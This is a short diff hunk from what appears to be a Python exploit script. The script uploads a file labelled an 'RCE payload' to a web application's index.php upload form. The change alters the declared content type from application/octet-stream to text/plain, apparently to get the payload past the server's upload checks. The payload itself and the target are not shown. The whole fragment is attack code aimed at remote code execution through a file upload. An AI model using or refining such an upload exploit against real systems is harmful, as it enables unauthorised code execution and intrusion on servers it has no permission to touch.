@@ -21,7 +21,7 @@ print("> Created payload")
 res = s.post(
     f"{url}/index.php",
     data={ "filename": filename },
-    files={"uploadedfile": (filename, payload, "application/octet-stream")}
+    files={"uploadedfile": (filename, payload, "text/plain")}
 )
 
 print("> RCE payload uploaded")
